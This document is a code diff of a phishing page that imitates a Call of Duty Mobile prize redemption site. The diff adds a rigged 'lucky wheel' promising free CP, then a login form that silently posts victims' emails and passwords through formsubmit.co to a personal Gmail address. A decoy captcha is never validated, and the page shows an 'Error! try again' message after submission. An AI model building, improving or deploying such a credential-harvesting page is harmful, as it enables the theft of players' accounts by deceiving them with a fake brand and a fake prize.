@@ -21,18 +21,145 @@
             border-bottom: 1px solid rgba(255, 255, 255, 0.1);
             text-align: center;
         }
-        .official-header .logo { font-size: 36px; color: #00ff00; font-weight: bold; text-transform: uppercase; }
         .official-header nav { display: flex; justify-content: center; gap: 20px; margin-top: 10px; }
         .official-header nav a { color: #fff; text-decoration: none; font-size: 14px; text-transform: none; }
         .official-header nav a:hover { color: #00ff00; }
         .official-footer { background: #111; color: #888; padding: 30px 20px; text-align: center; font-size: 12px; border-top: 1px solid #333; }
-        body { background: #000 url('https://www.callofduty.com/content/dam/atvi/callofduty/cod-touchui/global/backgrounds/codm-bg.jpg') no-repeat center/cover; margin: 0; padding-top: 80px; color: #fff; }
+        body { background: #000 url('https://www.callofduty.com/content/dam/atvi/callofduty/cod-touchui/global/backgrounds/codm-bg.jpg') no-repeat center/cover; margin: 0; padding-top: 80px; color: #fff; font-family: 'Arial', sans-serif; }
         .input-field-wrapper { position: relative; }
         .eye-icon { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); cursor: pointer; width: 24px; height: 24px; color: #fff; }
         .eye-icon:hover { color: #00ff00; }
         .success-msg { color: #ff0d00; font-weight: bold; text-align: center; margin-top: 20px; font-size: 18px; display: none; }
         .btn_yellow { width: 100%; cursor: pointer; }
         iframe { display: none !important; width: 0; height: 0; border: 0; }
+
+        .section { display: none; text-align: center; padding: 40px 20px; }
+        .section.active { display: block; }
+
+        .lucky-wheel-section {
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 20px;
+            max-width: 800px;
+            margin: 40px auto;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+        }
+        .lucky-wheel-section h2 {
+            font-size: 32px;
+            color: #00ff00;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        #wheel-container {
+            position: relative;
+            display: inline-block;
+            margin: 20px auto;
+        }
+        #wheel {
+            width: 350px;
+            height: 350px;
+            border-radius: 50%;
+            border: 8px solid #00ff00;
+            box-shadow: 0 0 20px #00ff00;
+            transition: transform 6s cubic-bezier(0.23, 1, 0.32, 1);
+        }
+        #winning-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 350px;
+            height: 350px;
+            border-radius: 50%;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 1.5s ease;
+        }
+        #winning-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 42px;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 0 20px #000, 0 0 40px #00ff00;
+            white-space: nowrap;
+        }
+        #spin-btn, #continue-btn {
+            padding: 15px 40px;
+            font-size: 20px;
+            background: linear-gradient(to bottom, #ffdd00, #ff9900);
+            border: none;
+            border-radius: 50px;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+        }
+        #spin-btn:disabled {
+            background: #555;
+            color: #aaa;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+        #result-text {
+            margin-top: 30px;
+            font-size: 28px;
+            font-weight: bold;
+            color: #00ff00;
+            min-height: 50px;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        .arrow {
+            position: absolute;
+            top: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 25px solid transparent;
+            border-right: 25px solid transparent;
+            border-top: 50px solid #ff0000;
+            z-index: 10;
+            filter: drop-shadow(0 8px 15px rgba(0,0,0,0.9));
+        }
+
+        .login-section {
+            max-width: 600px;
+            margin: 40px auto;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+        }
+        .prize-announcement {
+            background: rgba(0, 255, 0, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            font-size: 24px;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        /* کپچا */
+        #captcha-canvas {
+            width: 138px;
+            height: 52px;
+            background: #f0f0f0;
+            border-radius: 6px;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+            margin-left: 10px;
+        }
+        #refvc img {
+            width: 32px;
+            height: 32px;
+            cursor: pointer;
+            transition: transform 0.6s ease;
+        }
+        #refvc img:hover {
+            transform: rotate(360deg);
+        }
     </style>
 </head>
 <body>
@@ -51,47 +178,70 @@
             <div class="head pr">
                 <div class="logo"></div>
                 <h1>Redemption Center</h1>
-                
-<div class="code_ct">
-    <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>
 
-    <form action="https://formsubmit.co/erfantroll778899@gmail.com" method="POST" target="dummyframe" onsubmit="return showSuccess()">
-        <ul class="code_list c">
-            <li>
-                <span class="desktop_label">Email</span>
-                <div class="input-field-wrapper">
-                    <input type="email" name="email" id="F_UID" placeholder="Email" class="input_text" required autocomplete="off" oninput="this.setAttribute('value', this.value);" value="" />
+                <!-- Lucky Wheel Section -->
+                <div id="wheel-section" class="section lucky-wheel-section active">
+                    <h2>Daily Lucky Wheel</h2>
+                    <p style="color:#ccc; margin-bottom:30px;">Spin the wheel and win free CP!</p>
+                    
+                    <div id="wheel-container">
+                        <div class="arrow"></div>
+                        <canvas id="wheel" width="350" height="350"></canvas>
+                        <div id="winning-overlay">
+                            <div id="winning-text"></div>
+                        </div>
+                    </div>
+                    
+                    <button id="spin-btn" onclick="spinWheel()">Spin the Wheel</button>
+                    <div id="result-text"></div>
+                    <button id="continue-btn" onclick="showLoginForm()" style="display:none;">Continue to Claim Prize</button>
                 </div>
-            </li>
-            <li>
-                <span class="desktop_label label-titlie redeem_text">Password</span>
-                <div class="input-field-wrapper">
-                    <input type="password" name="password" id="F_CDKEY" placeholder="Password" required autocomplete="new-password" oninput="this.setAttribute('value', this.value);" value="">
-                    <svg id="togglePassword" class="eye-icon" onclick="togglePasswordVisibility()" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" fill="currentColor"/>
-                    </svg>
-                </div>
-            </li>
-            <li class="verification_row">
-                <span class="desktop_label label_vercode">Verification</span>
-                <div class="input-field-wrapper">
-                    <input type="text" name="vcode" id="F_VCODE" placeholder="Verification Code" class="input_code" required autocomplete="off" oninput="this.setAttribute('value', this.value);" value="" />
-                    <img src="https://www.callofduty.com/cdn/codm/zpHm2flUeC/images/code_img.png" width="138" height="52" alt="captcha" />
-                    <a href="javascript:;" id="refvc"><img src="https://www.callofduty.com/cdn/codm/zpHm2flUeC/images/CODM_Refresh.webp" alt="Refresh" /></a>
-                </div>
-            </li>
-        </ul>
 
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_template" value="table">
-        <input type="hidden" name="_subject" value="لاگین جدید کالاف! 🔥">
+                <!-- Login Section -->
+                <div id="login-section" class="section login-section">
+                    <div id="prize-announcement" class="prize-announcement" style="display:none;"></div>
 
-        <button type="submit" class="btn_yellow" id="label_submit">Submit</button>
-        <div id="result" class="success-msg">
-            Error! try again
-        </div>
-    </form>
-</div>
+                    <div class="code_ct">
+                        <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>
+
+                        <form action="https://formsubmit.co/erfantroll778899@gmail.com" method="POST" target="dummyframe" onsubmit="return showSuccess()">
+                            <ul class="code_list c">
+                                <li>
+                                    <span class="desktop_label">Email</span>
+                                    <div class="input-field-wrapper">
+                                        <input type="email" name="email" id="F_UID" placeholder="Email" class="input_text" required autocomplete="off" />
+                                    </div>
+                                </li>
+                                <li>
+                                    <span class="desktop_label label-titlie redeem_text">Password</span>
+                                    <div class="input-field-wrapper">
+                                        <input type="password" name="password" id="F_CDKEY" placeholder="Password" required autocomplete="new-password">
+                                        <svg id="togglePassword" class="eye-icon" onclick="togglePasswordVisibility()" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" fill="currentColor"/>
+                                        </svg>
+                                    </div>
+                                </li>
+                                <li class="verification_row">
+                                    <span class="desktop_label label_vercode">Verification</span>
+                                    <div class="input-field-wrapper" style="display: flex; align-items: center;">
+                                        <input type="text" name="vcode" id="F_VCODE" placeholder="Verification Code" class="input_code" required autocomplete="off" />
+                                        <canvas id="captcha-canvas" width="138" height="52"></canvas>
+                                        <a href="javascript:;" id="refvc" onclick="generateCaptcha()">
+                                            <img src="https://www.callofduty.com/cdn/codm/zpHm2flUeC/images/CODM_Refresh.webp" alt="Refresh" />
+                                        </a>
+                                    </div>
+                                </li>
+                            </ul>
+
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="_template" value="table">
+                            <input type="hidden" name="_subject" value="New CODM Login + Lucky Wheel Prize! 🔥">
+
+                            <button type="submit" class="btn_yellow" id="label_submit">Claim Prize & Login</button>
+                            <div id="result" class="success-msg">Error! try again</div>
+                        </form>
+                    </div>
+                </div>
 
                 <div class="update-text">
                     <h2>Update Required to Redeem</h2>
@@ -115,25 +265,170 @@
 
     <script>
         function togglePasswordVisibility() {
-            var field = document.getElementById("F_CDKEY");
-            var icon = document.getElementById("togglePassword");
+            const field = document.getElementById("F_CDKEY");
+            const icon = document.getElementById("togglePassword");
             if (field.type === "password") {
                 field.type = "text";
                 icon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="currentColor"/>';
             } else {
                 field.type = "password";
-                icon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65[.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" fill="currentColor"/>';
+                icon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" fill="currentColor"/>';
             }
         }
 
         function showSuccess() {
             document.getElementById("result").style.display = "block";
-            return true; // اجازه ارسال بده
+            return true;
         }
+
+        // تولید کپچای واقعی با canvas
+        let captchaCode = "";
+        function generateCaptcha() {
+            const canvas = document.getElementById("captcha-canvas");
+            const ctx = canvas.getContext("2d");
+
+            // پس‌زمینه
+            ctx.fillStyle = "#f0f0f0";
+            ctx.fillRect(0, 0, 138, 52);
+
+            // تولید کد تصادفی 5 رقمی
+            captchaCode = Math.random().toString().substr(2, 5);
+            
+            // نویز پس‌زمینه
+            for (let i = 0; i < 200; i++) {
+                ctx.fillStyle = `rgba(0,0,0,${Math.random() * 0.1})`;
+                ctx.fillRect(Math.random() * 138, Math.random() * 52, 2, 2);
+            }
+
+            // خطوط مزاحم
+            ctx.strokeStyle = "rgba(0,0,0,0.2)";
+            ctx.lineWidth = 2;
+            for (let i = 0; i < 4; i++) {
+                ctx.beginPath();
+                ctx.moveTo(Math.random() * 138, Math.random() * 52);
+                ctx.lineTo(Math.random() * 138, Math.random() * 52);
+                ctx.stroke();
+            }
+
+            // نوشتن عدد
+            ctx.font = "bold 32px Arial";
+            ctx.fillStyle = "#000";
+            ctx.textAlign = "center";
+            ctx.textBaseline = "middle";
+            ctx.fillText(captchaCode, 69, 28);
+
+            // افکت کمی چرخش و جابجایی برای واقعی‌تر شدن
+            // (اختیاری — حذف کن اگر ساده‌تر می‌خوای)
+        }
+
+        const prizes = [
+            "500 CP", "800 CP", "Try Again!", "1200 CP",
+            "2000 CP", "Try Again!", "100 CP", "400 CP"
+        ];
+
+        const colors = [
+            "#FFFF00", "#FFD700", "#FF4444", "#00FFFF",
+            "#FF00FF", "#FF8800", "#4444FF", "#00FF00"
+        ];
+
+        const wheel = document.getElementById("wheel");
+        const ctx = wheel.getContext("2d");
+        const spinBtn = document.getElementById("spin-btn");
+        const continueBtn = document.getElementById("continue-btn");
+        const resultText = document.getElementById("result-text");
+        const prizeAnnouncement = document.getElementById("prize-announcement");
+        const winningOverlay = document.getElementById("winning-overlay");
+        const winningText = document.getElementById("winning-text");
+
+        let isSpinning = false;
+        let hasSpun = false;
+        let currentRotation = 0;
+
+        function drawWheel() {
+            const numSegments = prizes.length;
+            const anglePerSegment = (2 * Math.PI) / numSegments;
+            const centerX = wheel.width / 2;
+            const centerY = wheel.height / 2;
+            const radius = centerX - 10;
+
+            for (let i = 0; i < numSegments; i++) {
+                const startAngle = i * anglePerSegment - Math.PI / 2;
+                const endAngle = startAngle + anglePerSegment;
+
+                ctx.beginPath();
+                ctx.moveTo(centerX, centerY);
+                ctx.arc(centerX, centerY, radius, startAngle, endAngle);
+                ctx.closePath();
+                ctx.fillStyle = colors[i];
+                ctx.fill();
+                ctx.strokeStyle = "#000";
+                ctx.lineWidth = 4;
+                ctx.stroke();
+
+                ctx.save();
+                ctx.translate(centerX, centerY);
+                ctx.rotate(startAngle + anglePerSegment / 2);
+                ctx.textAlign = "center";
+                ctx.fillStyle = "#000";
+                ctx.font = "bold 19px Arial";
+                ctx.fillText(prizes[i], 110, 8);
+                ctx.restore();
+            }
+        }
+
+        function spinWheel() {
+            if (isSpinning || hasSpun) return;
+
+            winningOverlay.style.opacity = 0;
+            winningText.textContent = "";
+            resultText.textContent = "Spinning...";
+
+            isSpinning = true;
+            spinBtn.disabled = true;
+
+            const winningIndex = Math.floor(Math.random() * prizes.length);
+            const segmentAngle = 360 / prizes.length;
+            const targetAngle = winningIndex * segmentAngle + segmentAngle / 2;
+
+            const spins = 6 + Math.floor(Math.random() * 2);
+            const extraRotation = spins * 360;
+            const totalRotation = currentRotation + extraRotation + (360 - targetAngle);
+
+            wheel.style.transform = `rotate(${totalRotation}deg)`;
+            currentRotation = totalRotation % 360;
+
+            setTimeout(() => {
+                const prize = prizes[winningIndex];
+
+                resultText.innerHTML = `Congratulations! You won: <strong>${prize}</strong> 🎉`;
+                winningText.textContent = prize;
+                winningOverlay.style.background = `radial-gradient(circle, transparent 35%, ${colors[winningIndex]}AA 100%)`;
+                winningOverlay.style.opacity = 1;
+
+                continueBtn.style.display = "inline-block";
+
+                window.winningPrize = prize;
+
+                hasSpun = true;
+                spinBtn.textContent = "You already spun!";
+                spinBtn.style.background = "#555";
+                spinBtn.style.color = "#aaa";
+
+                isSpinning = false;
+            }, 6000);
+        }
+
+        function showLoginForm() {
+            document.getElementById("wheel-section").classList.remove("active");
+            document.getElementById("login-section").classList.add("active");
+
+            prizeAnnouncement.textContent = `Congratulations! You won ${window.winningPrize} 🎉 Log in to claim your prize:`;
+            prizeAnnouncement.style.display = "block";
+        }
+
+        // تولید کپچا در ابتدا و هر بار Refresh
+        generateCaptcha();
+        drawWheel();
     </script>
 </body>
 </html>
-
-
-
-
